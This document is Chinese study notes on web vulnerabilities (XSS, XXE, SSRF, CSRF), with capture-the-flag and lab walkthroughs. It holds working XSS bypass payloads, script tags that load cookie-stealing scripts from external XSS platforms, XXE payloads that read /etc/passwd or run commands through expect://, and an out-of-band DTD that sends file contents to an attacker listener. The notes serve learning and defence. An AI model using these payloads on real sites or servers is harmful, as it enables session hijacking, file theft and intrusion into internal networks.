
这是之前的学习笔记，学了xss，xxe，ssrf和csrf的内容，内容比较杂，还打了相关的靶场。
# XSS
## 原理
XSS（跨站脚本攻击）是 Web 安全中最常见的漏洞之一，核心是攻击者向 Web 页面注入恶意脚本，当用户访问页面时脚本被执行，从而窃取信息、劫持会话或执行恶意操作。
***
## XSS各种类型
### 反射型
恶意脚本通过**URL 参数、表单提交**等方式 “反射” 给用户，仅触发一次，脚本不存储在服务器。主要是通过get请求或post请求传入内容给后端处理，并且响应到前端界面上，例如`?key=<script>alert(1)</script>`后端处理后会把他当成javascript代码执行，并在前端浏览器界面回显一个提示框。
### 存储型
恶意脚本被**永久存储**在目标服务器（数据库、文件、缓存等），所有访问该页面的用户都会触发脚本执行，危害极大。
**攻击流程**
- 攻击者将含恶意脚本的内容（如评论、昵称、私信）提交到目标网站
- 网站未过滤 / 转义，直接将脚本存入数据库
- 其他用户访问包含该内容的页面时，脚本从服务器加载并在用户浏览器执行
例如你在b站发表一个评论，`<script>alert(1)</script>`如果服务器没有进行任何过滤和转义的话，之后每个用户访问这个页面都会有弹窗。
### DOM型
恶意脚本的执行完全发生在**客户端 DOM 层面**，服务器未参与脚本的存储 / 反射，仅前端 JS 操作 DOM 时引入未过滤的用户输入。
**攻击流程**
- 攻击者构造含恶意输入的 URL（如`http://target.com/#<script>alert(1)</script>`）；（其中`#`是哈希分隔符，`#`后的内容是哈希片段，浏览器请求时会忽略#后的内容，只会把前面的部分发送给服务器。`#<script>alert(1)</script>` 完全留在客户端，服务器日志、响应源码中都看不到这部分内容；攻击者可以把恶意脚本藏在 `#` 后，绕过服务器的安全规则。）
- 受害者访问该 URL，页面加载后前端 JS（如 jQuery 的`$('#content').html(location.hash)`）读取 URL 参数并直接插入 DOM；
- 浏览器解析 DOM 时执行恶意脚本。
***
## 常见身份凭证
### cookie
服务器发送给客户端浏览器的小型文本文件，存储在本地，每次请求自动携带到服务器（HTTP 请求头的`Cookie`字段）。用来维持登录状态（如`sessionid`、`JSESSIONID`）、记录用户偏好（如主题、语言）。XSS就可以窃取用户cookie
### Session
服务器端存储的用户会话数据（如登录状态、权限信息），客户端仅通过 Cookie 携带`sessionid`（会话标识）关联会话。用户登录成功后，服务器创建唯一`sessionid`，并存储用户信息（如`user_id=123`）到服务器（内存、数据库、Redis 等）；
### Token
服务器生成的一串加密字符串，作为用户身份的 “临时凭证”，客户端需主动在请求头 / 参数中携带（如`Authorization: Bearer <token>`）。无状态（服务器不存储会话数据，Token 本身包含用户关键信息，通过加密保证完整性）。
### 账号密码
用户注册时设置的唯一标识（如用户名、手机号、邮箱）+ 验证口令（密码），是最基础的身份凭证。密码如果太弱会有被爆破的可能。
### 区别
- cookie存储在客户端，容易盗取，session存储在服务端，不易盗取
- cookie仅能存储文本大小限制4kb,而session无限制，取决于服务器性能。
- token无需依赖 Cookie（可在请求头 / Body 中携带），适配移动端 APP、小程序等无 Cookie 场景,但是token也是经常被写在cookie里头的
- token有效期通常较短（如 1 小时），需通过 “刷新令牌（Refresh Token）” 续期。
***
## XSS作用
- 可以用来窃取身份凭证（cookie,token,api-key等），页面敏感数据(用户手机号邮箱等)
- 可以用来钓鱼,窃取用户输入，通过伪造表单来诱导用户输入密码，以达到窃取用户敏感信息的作用
- 利用用户当前会话执行敏感操作：修改密码、绑定手机号、转账、发布恶意内容、添加管理员；
- 内网探测：以用户浏览器为跳板，探测内网 IP、端口（如访问`192.168.0.0/24`网段，发现内网未公开的服务）；
- 绕过 CSP（内容安全策略）：通过变形 Payload（如`svg/onload`、`javascript:`伪协议）绕过脚本执行限制；
- 可以过滤`//`和`/**/`注释符，防止把必须的输入放到注释后，不影响javascript代码执行
***
## XSS防御
- 对用户输入进行严格过滤，如`<script>` `svg`等危险标签，和`onclick onerror onload onmouseover`等危险的事件属性，对他们进行替换或移除
- 避免对用户输入进行直接拼接，可以用`htmlspecialchars`对用户输入进行html实体转义，记得转义时要加参数ENT_QUOTES，不然这个函数默认不转义单引号。
- html转义可以避免直接拼接可以避免用户输入导致提前闭合（类似sql注入）
- 通过过滤避免使用javascript伪协议。
- 把用户输入强制转为小写，避免大小写绕过。
- 尽量不把用户输入的非法字符串直接替换为空，或者写一个循环，避免双写绕过
- 因为浏览器解析是支持unicode十进制和十六进制编码，所以为了防止编码绕过，可以对`&#`进行过滤
- 等等.....
***
## 靶场WP(学到了各种绕过手法)
### level1
第一关没有任何过滤，可以输入html标签,例如一个超链接`?name=<a href="http://www.baidu.com">百度网址</a>`,可以试一下，用`<script>alert('1')</script>`其中`<script>`：HTML 中的脚本标签，用于定义客户端 JavaScript 代码，浏览器解析到该标签时会执行内部的代码；`alert(1)`：JavaScript 的内置函数，作用是弹出一个包含指定内容的警告框（这里弹出内容为数字`1`）。看一下源码，其中
```html
window.alert = function()  //对原alert进行重写，不再执行原生alert代码,执行自定义的代码
{    
confirm("完成的不错！");
 window.location.href="level2.php?keyword=test";
}
```

```php
$str = $_GET["name"];
echo "<h2 align=center>欢迎用户".$str."</h2>";//漏洞出现的点，直接拼接，没有任何过滤，类似sql注入
```
### level2
随便输入一个东西`<a href="http://www.baidu.com">百度网址</a>`他没有渲染，看一下前端代码，有一句`<input name=keyword value="<a href="http://www.baidu.com">百度网址</a>">`可以看到没有执行的原因是他直接把我的输入当成字符串赋值给value了，并且使用双引号包裹，这时可以想到让他提前闭合，让后续的代码逃逸出来并执行，输入`"><script>alert(1)</script>`让他从`<input>`里完全逃逸出来，也可以不加<,让他在`<input>`里执行,输入`" onclick=alert(1) "`,回车后点击一下输入框执行成功（前一个双引号和value的第一个双引号闭合，后一个双引号和value的第一个双引号闭合），也可以提前闭合`<input>`,后面注释掉，用`" onclick=alert(1)><!--`，这个逻辑和sql注入十分像.分析一下源码,之所以最开始没执行成功，是因为
```php
$str = $_GET["keyword"];
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
```
对传入字符进行了html转义，使代码更安全，但是f12里还是原字符串(`<h2 align=center>没有找到和123相关的结果.</h2><center>`)，是因为显示时自动还原了一次.但是真正出漏洞的地方是
```php
<input name=keyword  value="'.$str.'">
```
直接对字符串拼接，没有任何其余操作
### leval3
这一关可以看到，相比上一关，他的value值也进行了转义，但html转义默认不转义单引号，可以用单引号闭合一下，可以试一下`' onclick=console.log("123") '`输入后点击输入框，可以在控制台看到输出123，说明执行成功了，同理`' onclick=alert(1) '`也可以执行(因为这一关会对其他字符转义，所以`<script>`和注释就不可以了)。看一下源码
```php
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>"."<center>
<input name=keyword  value='".htmlspecialchars($str)."'>
```
都进行了转义，可以对htmlspecialchars函数加一个参数ENT_QUOTES,即`htmlspecialchars($str,ENT_QUOTES)`
### leval4
这一关直接把`<>`删掉了，并且不能双写绕过，但还是可以双引号闭合的(没对双引号实体转义)，所以`" onclick=alert(1) "`成功执行。看一下源码
```php
$str = $_GET["keyword"];
$str2=str_replace(">","",$str);//替换所有<>
$str3=str_replace("<","",$str2);
<input name=keyword  value="'.$str3.'">
```
可以看到，把用户输入的`<>`都替换为空了,但对str3没有进行转义，可以不用`<>`
### leval5
这一关不论输入`<script>`还是`onclick`都会在中间自动加一个下划线，导致无法执行，但这一关可以用伪协议，在特殊的一些属性里来执行一些javascript代码,可以`"><a href=javascript:alert(1)>千万不要点我</a>`输入后点击`千万不要点我`即可通关。网页可以自动解析十进制十六进制的编码，例如把java用html实体十六进制加密为`&#x6a;&#x61;&#x76;&#x61;`进行替换，原代码依然可以执行，看源码
```php
$str = strtolower($_GET["keyword"]);
$str2=str_replace("<script","<scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
<input name=keyword  value="'.$str3.'">
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
```
可以看到他是把`<script>`替换掉了，把on也替换掉了，但还是老问题，value值没转义直接拼接，并且他没有对echo里的内容做过滤
### leval6
这一关输入`"><a href=javascript:alert(1)>你好</a>`虽然逃逸出来了，但是他没有形成超链接，看一下f12,`value=""><a hr_ef=javascript:alert(1)>你哈</a>">`他把href替换了，script标签也被过滤了，可以试一下大小写绕过，改为`"><a hRef=javascript:alert(1)>你好</a>`直接成功了，`"><scRipt>alert(1)</Script>`也可以，看源码
```php
$str = $_GET["keyword"];
$str2=str_replace("<script","<scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
<input name=keyword  value="'.$str6.'">
```
看似过滤很严格，实际上`str_replace`是严格区分大小写的，但代码解析时不区分大小写，就绕过了
### leval7
输入`"><scRipt>alert(1)</Script>`发现把script替换为空了，大小写也不能绕过，试一下伪协议`"><a href=javascript:alert(1)>你好</a>`发现连伪协议里的script都过滤了，href也替换为空了，试一下双写绕过`"><a hrhrefef=javascrscriptipt:alert(1)>你好</a>`成功了，也可以`"><scrscriptipt>alert(1)</scscriptript>`,也可以`" oonnclick=alert(1) "`,只进行一次替换，并且替换为空才可以双写绕过，源码
```php
$str =strtolower( $_GET["keyword"]);
$str2=str_replace("script","",$str);
$str3=str_replace("on","",$str2);
$str4=str_replace("src","",$str3);
$str5=str_replace("data","",$str4);
$str6=str_replace("href","",$str5);
<input name=keyword  value="'.$str6.'">
```
只替换一次,这一关strtolower把输入字符转换为小写，无法大小写绕过
### leval8
这一关的输入被放进一个超链接的href属性里了`</center><center><BR><a href="http://www.baidu.com">友情链接</a>`,这时想到可以用伪协议,输入`javascript:alert(1)`发现`<a href="javascr_ipt:alert(1)">`被替换了，伪协议格式是`javascript:`后跟要执行的javascript代码，但因为浏览器解析是支持，unicode十进制和十六进制编码，可以对script用unicode十六进制编码一下`java&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert(1)`输入直接成功，也可以用十进制`java&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)`看源码
```php
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);//防止大写绕过
$str2=str_replace("script","scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
$str7=str_replace('"','&quot',$str6);
 echo '<center><BR><a href="'.$str7.'">友情链接</a></center>';
```
直接对过滤后的内容拼接，如果想避免编码绕过的话，可以把`&#`也替换一下
### leval9
输入`javascript:alert(1)`点击显示`您的链接不合法？有没有！`,编码后还是不合法，试一下发现输入的内容里必须有`http://`可以试着把http://注释掉，不影响javascript代码执行,他还把script替换了，可以编码绕过`javascrip&#116;:alert(1)//http://`注释`//`可以单行注释，`/**/`可以多行注释，看源码
```php
if(false===strpos($str7,'http://'))
{
  echo '<center><BR><a href="您的链接不合法？有没有！">友情链接</a></center>';
        }
else
{
  echo '<center><BR><a href="'.$str7.'">友情链接</a></center>';
}
```
可以看到必须有`http://`这个字符
### leval10
这一关没有了输入框，可以试一下`<script>alert(1)</script>`没反应，他把`<>`直接过滤了，还转义了，看一下前端代码，有
```html
<input name="t_link" value="" type="hidden">
<input name="t_history" value="" type="hidden">
<input name="t_sort" value="" "" type="hidden">
```
分别用get参数传一下参，`&t_link=123&t_history=123&t_sort=123`查看前端代码
```html

<input name="t_link" value="" type="hidden">
<input name="t_history" value="" type="hidden">
<input name="t_sort" value="123" type="hidden">
```
发现只有`t_sort`有反应，可以只传`t_sort`参数`?t_sort=" onclick=alert(1) "`发现虽然可以传入成功，但是没有输入框可点，可以自己加一个输入框`?t_sort=" onclick=alert(1) " type=text`出现一个输入框，点一下就行了，原来type=hidden,修改为text就行了，但这样还需要点击，可以不用点击`?t_sort=" onfocus=alert(1) " type=text autofocus`直接触发,界面直接卡死，关不掉。看源码
```php
$str11 = $_GET["t_sort"];
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
<input name="t_sort"  value="'.$str33.'" type="hidden">
```
发现t_sort才是真正要传的参数
### leval11
这一关直接看源码
```php
$str11=$_SERVER['HTTP_REFERER'];
```
发现他接受的是referer参数，其余过滤与上一关相同，在referer里输入`" onclick=alert(1) " type=text`点一下就成了.主要漏洞成因还是过滤不严谨，并且直接拼接，没有任何转义
### leval12
这一关看源码
```php
$str11=$_SERVER['HTTP_USER_AGENT'];
```
在user-agent传参，其余与上一关一样,payload`" onclick=alert(1) " type=text`
### 支持伪协议的常见属性
- `href`属性，主要用于`<a>`和`<area>`标签，当href的值以`javascript:`开头时，点击链接会执行对应的javascript代码，
```html
<a href=javascript:alert(1)>你好</a>
```
- `formaction/action`属性，用于`<button>`和`<input>`标签，指定表单提交时的处理地址，如果该属性的值以`javascript:`开头，提交表单时会执行相应的javascript代码
```html
<form>
	<button formation="javascript:alert(1);">submit</button>
</form>
```
### 什么时候用伪协议，什么时候用JS代码表达式
类似onclick,onload这类onxxx的属性，他们是html标签的事件属性，可以直接插入JS代码表达式。像是a标签的href属性不属于事件属性，就要用伪协议了。
### leval13
看源码
```php
$str11=$_COOKIE["user"];
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
```
这次传的时cookie,所以payload`user=" onclick=alert(1) " type=text`
### leval14
这一关有一个上传图片的界面，图片上传后可以解析出他的exif信息，但这需要把phpstudy里php_exif扩展打开，这一关可以在图片的exif里插入javascript语句![](/image/70.png)再上传这个图片文件，就可通关
### leval15
AngularsJS(前端框架)中，ng-include属性引用外部html触发xss,因为默认下，`ng-include`只能加载与当前页面同源（相同域名，端口和协议）的文件，所以这里传递了第一关的地址和paylaod,
```html
?src='level1.php?name=<img src=1 onerror=alert(1)>'//正确payload,因为src指向的1并不存在，会执行onerror的alert(1)
?src='level1.php?name=<script>alert(1)</script>//这个不行，因为源码中由转义
```
### leval16
这一关看源码，
```php
$str = strtolower($_GET["keyword"]);
$str2=str_replace("script","&nbsp;",$str);
$str3=str_replace(" ","&nbsp;",$str2);
$str4=str_replace("/","&nbsp;",$str3);
$str5=str_replace(" ","&nbsp;",$str4);
```
把空格和script都html实体转义了，可以用`%0a`代替空格，
payload`?keyword=<img%0asrc=123%0aonerror=alert(1)>`
### leval17
这一关看源码，
```php
echo "<embed src=xsf01.swf?".htmlspecialchars($_GET["arg01"])."=".htmlspecialchars($_GET["arg02"])." width=100% heigth=100%>";//没有对空格做任何处理
```
传入`?arg01=a&arg02=123 onmouseover=alert()`中间用空格分割，后面的东西会自动识别为属性，而非字符串，因为没有点击事件，所以用onmouseover代替，只要鼠标移动就自动触发。
### leval18
与上一关相同`?arg01=a&arg02=123 onmouseover=alert(1)`
### leval19
这一关需要浏览器下一个flash-player插件，再下一个JPEX反编译工具，通过`<embed src="xsf03.swf?a=b`可以看到他是加载了xsf03这个文件，这个文件用jpex打开可以看到源码，原来的界面是![](/image/71.png)
在源码中找到这一段，
```php
static var VERSION_WARNING = "Movie (436) is incompatible with sifr.js (%s). Use movie of %s.<br><strong>Movie (436) is incompatible with sifr.js (%s). Use movie of %s.</strong><br><em>Movie (436) is incompatible with sifr.js (%s). Use movie of %s.</em><br><strong><em>Movie (436) is incompatible with sifr.js (%s). Use movie of %s.</em></strong>";
```
%s对应了上面的undefined,%s其实是占位符，看前端可以看到他是这个文件也可以接受类似的url的get参数，再往下找代码，
```php
if(_loc5_ && _root.version != sIFR.VERSION)
      {
         _loc4_ = sIFR.VERSION_WARNING.split("%s").join(_root.version);
      }
```
还有一句
```php
class sIFR
{
   static var VERSION = "436";
}
```
可以看到这个sIFR.VERSION就是指的436，作用就是用`_root.version`的值替换了原来%s的值，只有你传的是version这个参数他才会有值，不然是Undefined,试着传入`?arg01=version&arg02=123`![](/image/72.png)找到了可控点，可以传参`?arg01=version&arg02=<a href="javascript:alert(1)">666</a>`可以成功，
### leval20
与上一关相似，看源码
```php
flashvars = LoaderInfo(this.root.loaderInfo).parameters;
id = flashvars.id;
button.graphics.drawRect(0,0,Math.floor(flashvars.width),Math.floor(flashvars.height));
{
            ExternalInterface.call("ZeroClipboard.dispatch",id,"mouseOut",null);
         });
```
ExternalInterface.call这个函数主要是拼接一段代码让前端调用，存在提前闭合的可能性，payload`?arg01=id&arg02=xss"\))}catch(e){alert(/xss/)}//&width=123&height=123`
***
## CTFHUB的XSS部分WP
### 反射型
先用`<script>alert(1)</script>`验证发现有xss漏洞，再用tlxss新建一个项目，点击查看配置代码，![](/image/73.png)把第二栏的内容复制到输入框里，再把此时的url(即http://challenge-9d74fdc57b355bb1.sandbox.ctfhub.com:10800/?name=%3CsCRiPt+sRC%3D%2F%2Fxs.pe%2FNxn%3E%3C%2FsCrIpT%3E)输入到url输入框里，第二个输入框是模拟目标网站用户点击受污染的 URL 链接，如果点击了这个链接，那么刚刚注入的 XSS 代码将会被执行并传递到本地服务器中,显示成功，这时就可以在TLXSS平台看到flag![](/image/74.png)

### 存储型
这一关与上一关差不多，区别于前面反射型xss的是，他建立恶意连接是在于每一次都要发送含恶意代码，而这个存储xss不需要，一旦发送过一次，以后每次访问它时，都会含有恶意代码，得到flag![](/image/75.png)

### DOM反射
直接输`<script>alert(1)</script>`竟然没反应，可以看一下代码，![](/image/76.png)发现原来需要用`';</script><script>`包裹闭合，所以最终输入`';</script><sCRiPt sRC=//xs.pe/Nxn></sCrIpT><script>`再传入url，的到flag![](/image/75.png)

### DOM跳转
输入框不能用，可以看一下源码，发现![](/image/77.png)
解释一下这段代码，
- location.search 获取当前URL中?号开始的查询字符串部分.例如：URL为 `http://example.com?jumpto=news.html` 时，location.search 返回?jumpto=news.html
- split("=")用等号分割查询字符串，上述例子会被分割为数组：`["?jumpto", "news.html"]`
- `target[0].slice(1)` 处理第一个参数,`target[0]`是指第一个参数，也就是`?jumpto` `slice(1)`去掉第一个字符问号，得到`jumpto`
- 判断` if (target[0].slice(1) == "jumpto")` ,验证第一个参数名是否为jumpto
- `location.href = target[1]` 执行跳转,当条件满足时，页面会自动跳转到`target[1]`指定的地址,所以只需要手动传一个get参数jumpto就行了
- 这段代码的作用是从当前页面的URL中获取查询字符串（URL的get参数），如果参数名为"jumpto"，则将页面重定向到参数值所指定的URL。
- 而当我们传递类似于`jumpto=javascript:alert(1)`这样的代码时，浏览器会将其解释为一种特殊的URL方案，即 “javascript:”。在这种情况下，浏览器会将后面的 JavaScript 代码作为URL的一部分进行解析，然后执行它。![](/image/78.png)
构造payload`?jumpto=javascript:$.getScript("//ujs.ci/oyg")`这段代码使用了jQuery的$.getScript()函数来异步加载并执行来自xss平台的js脚本，使用前提是网站引用了jQuery。之前的TLXSS是不可以的，可以用[这个](https://xssjs.com/register/)只要复制这一部分![](/image/80.png)到个体参数里，然后发送url,得到flag![](/image/79.png)
### 过滤空格
因为空格被过滤了，空格可以用`/`或`/**/`代替，其余操作同第一关
### 过滤关键字
这一关试一下，`<script>alert(1)</script>`没有弹窗，![](/image/81.png)发现script被过滤了，可以用大小写绕过，xss网页给的本身就是大小写混合的，可以直接上传成功，也可以试一下双写绕过，`<scrscriptipt>alert(1)</scriscriptpt>`执行成功，![](/image/82.png)
### ak啦
![](/image/83.png)
# XXE
全称为XML外部实体注入。外部实体，用来引入外部资源，实体来自SYSTEM来自本地资源PUBLIC公共计算机。xxe漏洞出现的原因就是外部引用DTD文件，可以读取DTD文件，也可以读取其他的文件，造成文件读取漏洞。但还得用命名实体给文件内容展示出来。
## 靶场wp(学习)
看源码
```php
<?php  
  
error_reporting(0);  
libxml_disable_entity_loader(false);  
$xml = file_get_contents('php://input');  //把提交的post参数内容赋值给$xml
if(isset($xml)){    
$dom = new DOMDocument();  
$dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);    
$creds = simplexml_import_dom($dom);    
$benben = $creds->admin;  //指定枝叶必须为admin
    echo $benben;  
}  
highlight_file(__FILE__);  
?>
```
这个需要传post参数，但是不能用hackbar,只能用bp,因为传的内容的Content-Type是application/xml;charset=utf-8，hackbar里默认没这个选项，可以抓到包后右键修改请求为post,修改Content-Type为application/xml;charset=utf-8,再提交post,`<root><admin>666</admin></root>`记得一定要写在一行。但bp会自动换行。这样页面就会显示。![如图所示](/image/119.png)根据这个可以外部引用和命令实体来读取文件。`<!DOCTYPE root [<!ENTITY ben SYSTEM "file:///etc/passwd">]><root><admin>&ben;</admin></root>`可以读取到文件内容并回显到界面
题目给了一个登录界面，随便输入用户密码抓包，发现用户名是在界面会显的,可以改post请求为
```xml
<!DOCTYPE root [<!ENTITY niu SYSTEM "file:///etc/passwd">]>
<user><username>&niu;</username><password>admin</password></user>
```
得到文件内容
如果刚才的方法被过滤了，可以用另一个方法。
利用参数实体及外部实体读取文件。
可以在kali主机上写一个1.dtd文件，内容是`<!ENTITY ben SYSTEM "file:///etc/passwd">`再开一个web服务，`python3 -m http.server 80`再在写入`<!DOCTYPE root [<!ENTITY % dazhuang SYSTEM "http://172.27.8.213/1.dtd"> %dazhuang;]>`最终实现读取文件，172.27.8.213是kali的ip，其实就是把kali的1.dtd文件读走，再赋值给参数实体%dazhuang,记得调用的是&ben;
也可以利用SSRF做一个XXE的漏洞利用，`<!DOCTYPE root[<!ENTITY ben SYSTEM "http://10.1.2.3">]><user><username>&ben;</username><password>admin</password></user>`其中10.1.2.3是一个内网ip,这样就可以访问内网内容。
也可以在xxe中用php伪协议读取文件。可以用来读取网页源代码，方便找其他漏洞。构造payload`<!DOCTYPE root[<!ENTITY ben SYSTEM "php://filter/read=convert.base64-encode/resource=http://10.1.2.3/?cmd=cat+index.php">]><user><username>&ben;</username><password>admin</password></user>`读取到内容后再base64解码，得到内容。
利用expect扩展进行命令执行。
这个直接用`<!DOCTYPE root[<!ENTITY xxe SYSTEM "expect://ls">]><user><username>&xxe;</username><password>admin</password></user>`来执行命令。但expect://协议拒绝七个字符：空格，`"`双引号,`|`管道符,`{}`大括号，`\`反斜杠，`<>`尖括号，`:`冒号。
**无回显XXE带外数据**:
- 验证漏洞是否存在，使用`<!DOCTYPE root [<!ENTITY % file SYSTEM "http://8nwnaakxrx12ipd17n24ls0wenke84wt.oastify.com/benben"> %file;]>`定义参数实体file,并直接调用%file,执行http://协议，访问域名,DNSlog的原理是利用DNS协议的特性，将需要收集的信息编码成DNS查询请求，然后将请求发送到DNS服务器，最后通过DNS服务器的响应来获取信息。其中`http://8nwnaakxrx12ipd17n24ls0wenke84wt.oastify.com`可以用bp的Collaborator功能得到,![](/image/120.png)点击复制到剪切板就行了。这时发送请求，可以在Collaborator界面刷新请求，找到http://协议，可以看到get请求的请求包 ，![](/image/121.png)这样就可以验证是否有漏洞，如果找到对应的响应包，就可以验证有漏洞。也可以用kali监听一个端口，`nc -lvp 7777`就可以把域名位置改为，http://kali的ip:7777/benben,这时就可以在kali监听到，![](/image/122.png)
- 带外数据：这里先展示一种错误的方法，`<!DOCTYPE test [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % send SYSTEM "http://8nwnaakxrx12ipd17n24ls0wenke84wt.oastify.com/%file;"> %send;]><user><username>admin</username><password>admin</password></user>`把读取到的文件内容让域名去访问，这样就可以在http包里看到内容，但这样是不行的，根本抓不到包。失败的原因是内部DTD不可以把一个参数实体在另一个参数实体里调用。但外部DTD允许把一个参数实体在另一个参数实体里调用。所以就可以这样办，在kali上放一个DTD文件(内容是`<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd"><!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://kali的ip:7777/?p=%file;'>">`，其中`&#37`是%的实体)，解释payload,参数实体file用php伪协议把file:///etc/passwd的结果进行base64加密，参数实体send用http协议把%file的值get提交给参数实体int包含了参数实体send,再搭建web界面`python3 -m http.server 80`, 同时用kali开一个监听端口`nc -lvp 7777`让靶机用http协议把DTD文件下载下来，再用参数实体触发里面的参数，然后在bp提交`<!DOCTYPE conver [<!ENTITY % remote SYSTEM "http://kali的ip/1.dtd">%remote;%int;%send;]>`发送后可以在kali里得到base64编码后的内容。执行流程是先执行remote把1.dtd文件下载下来，再执行int,把int的内容放里面，最后执行send.
**Xinclude**:xinclude 可以包含一个XML文件，调用一个写好的XML文件，和php里的include类似，
基本语法
```xml
<!--声明命名空间--><root xmlns:xi="http://www.w3.org/2001/XInclude">
<!--包含外部xml文件-->
<xi:include href="header.xml"/>
<!--文档主体内容-->
<content>这是文档内容</content>
<!--包含另一个文件-->
<xi:include href="foot.xml"/>
</root>
```
xml文件不能有换行符，`<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="/etc/passwd" parse="text"/></root>`可以直接读取到文件内容显示在界面上。
**SVG**:可缩放矢量图形，基于XML标记语言，用于描述二维的矢量图形。是一种图片格式。基本格式是
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///flag">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="800" height="200">
  <text x="10" y="40" font-size="30">&xxe;</text>
</svg>
```
# SSRF&CSRF
## 原理
**SSRF**(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞,本质是一个信息泄露的漏洞。
一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统），形成原因大部分时因为服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤和限制。
**有可能会有ssrf漏洞的地方**
- 从指定url地址获取网页文本内容
- 加载指定地址的图片，下载
- 百度识图，给出url就能识别出图片
**攻击方式**：
![](/image/84.png)
主机A提供了公网服务，可以直接访问，但攻击者无法直接访问B,可以借助A主机来攻击B主机，这就是SSRF的攻击方式。
**CSRF**(Cross-Site Request Forgery，跨站请求伪造)是一种利用用户身份权限发起非自愿请求的 Web 攻击方式，核心是盗用用户的会话凭证，让用户在不知情的情况下，以自己的身份向目标网站执行预设操作。
攻击的前提是 **用户已登录目标网站**，且浏览器中保存了该网站的有效会话凭证（如 Cookie、Session ID）。
**攻击方式**:
- **用户登录可信网站 A**：访问网站 A 并完成登录，网站 A 在用户浏览器中种下身份凭证（如 Session Cookie），且该 Cookie 处于有效期内。
- **用户被诱导访问恶意网站 B**：攻击者诱导用户（通过钓鱼链接、邮件附件、恶意广告等方式）打开恶意网站 B。
-  **恶意网站发起跨站请求**：网站 B 中嵌入了一段针对网站 A 的恶意请求代码（如表单自动提交、AJAX 请求）。当用户访问 B 时，浏览器会**自动携带网站 A 的 Cookie** 向 A 发送请求，网站 A 会误以为该请求是用户主动发起的，从而执行操作（如转账、改密码、发表评论等）。
浏览器的**同源策略对 Cookie 的 “自动携带” 机制**：当向某域名发送请求时，浏览器会自动携带该域名下的有效 Cookie，无论请求来自哪个网站。而目标网站仅通过 Cookie 验证用户身份，却没有验证请求的**发起者是否为用户本人**。
***
## 区别及作用
**CSRF**（跨站请求伪造）利用**已登录用户的身份权限**，诱导用户在不知情的情况下，以自己的名义向目标网站发起非自愿请求，执行攻击者预设的操作（如改密码、转账、删数据等）。
**SSRF**（服务器端请求伪造）诱导**目标服务器**代替攻击者发起请求（可访问内网 / 本地资源），突破服务器的网络访问限制，攻击内网服务、读取本地文件、探测端口等。
****
## 防御方式
1. 解析目标URL,获取host。
2. 如果用的是域名，先进行解析，解析后拿到ip地址。可以防止xip.io/xip.name及短链变换等url的变形和ip进制转换。
3. 检查ip地址是否为内网，拒绝内网访问。
4. 请求url,如果有跳转可以拿出跳转的url再解析。防止302跳转
***
## NAT
NAT 即**网络地址转换**，通过将一个外部ip地址和端口映射到更大的内部ip地址集来转换ip地址。主要解决ipv4地址短缺问题。
**端口映射**:如果外部服务器要访问内网，可以访问公网ip加指定的端口，防火墙接收到这个数据包就会自动把他改为私网地址和私网IP，进而访问到内网服务器。
***
## 内网外网
**内网**:「内部专用网络」，仅限特定范围（如家庭、公司、学校）内的设备互相访问，外部网络无法直接连接。
**外网(公网)**:「全球公开网络」，连接全世界的设备（服务器、个人设备等），是不同内网之间通信的桥梁。
***
## SSRF常用伪协议
- `file://`从文件系统中获得文件内容，如`file:///etc/passwd`
- `dict://`字典服务协议，访问字典资源，如`dict://ip:6739/info`
- `ftp://`用于网络端口扫描
- `sftp://`SSH文件传输协议或安全文件传输协议
- `ldap://`轻量级目录访问协议
- `tftp://`简单文件传输协议
- `gopher://`分布式文档传递服务，可以利用gopher://伪协议发送get,post请求。基本格式`URL:gopher://<host><port>/<gopher-path>`gopher协议默认端口70,web需要加端口号80.
***
## SSRF漏洞产生函数
- **file_get_contents()**：支持多协议，用户传入`http://内网IP`或`file:///etc/passwd`即可触发
- **curl_exec()**：cURL 库，支持`http`/`https`/`gopher`/`dict`等协议，可构造复杂 SSRF 请求
- **fopen()**：与`file_get_contents`类似，打开远程 / 本地资源
- **fsockopen()**：手动创建 socket 连接，可指定内网 IP + 端口，探测内网服务
- **readfile()**：输出远程 / 本地文件内容，支持多协议

***
## 靶场WP(学绕过方式)
搭建靶场，先进入wsl kali-linux,再进入靶场文件`cd /mnt/wsl/old(1)/ssrf_vul-old`再`docker-compose up -d`启动，记得提前把docker-desktop打开，启动成功后访问`http://192.168.240.207:8080/`即宿主机ip:端口(默认8080)
进入靶场，可以看到是一个站点快照获取界面，可以试一下输入`http://www.baidu.com/robots.txt`![](/image/85.png)可以猜到很有可能有ssrf漏洞。
1. **首先**可以试着用file://伪协议读取一点东西
    - `/etc/passwd`读取文件passwd
    - `/etc/hosts`显示当前操作系统网卡ip
    - `/proc/net/arp`显示arp缓存表（寻找内网其他主机）
    - `/proc/net/fib_trie`显示当前网段路由信息
2. 读取`/etc/passwd`试一下，`file:///etc/passwd`读取成功。
3. 接下来查这台主机所处的内网网段是多少，读取`file:///etc/hosts`可以看到![](/image/86.png)可以看到有一张处于172.72.23.网段的网卡
